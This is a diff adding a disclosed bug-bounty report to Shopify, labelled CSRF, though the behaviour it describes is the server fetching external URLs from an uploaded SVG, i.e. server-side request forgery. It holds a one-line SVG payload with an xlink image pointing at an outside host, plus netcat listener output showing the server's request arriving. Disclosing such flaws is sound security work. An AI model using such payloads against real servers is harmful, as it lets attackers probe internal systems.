@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/97501
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/ogig
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:02.06.2016 12:57:44
+
+Summary:
+
+Uploading SVG that include
+
+```
+ <image xlink:href="http://example.com/?evil=var" />
+```
+
+will cause the server side parser to try to fetch external resources.
+
+I've tested in two ways. Creating an svg with an external loaded public google image that was rendered perfectly. 
+
+Also tested a private server with nc and created an svg that uses xlink for private url. I uploaded the svg and nc output was this. 
+
+```
+Listening on [0.0.0.0] (family 0, port 3001)
+Connection from [23.227.55.103] port 3001 [tcp/*] accepted (family 2, sport 49391)
+GET /?evil=var HTTP/1.0
+Host: 37.139.18.151:3001
+Accept-Encoding: gzip
+```
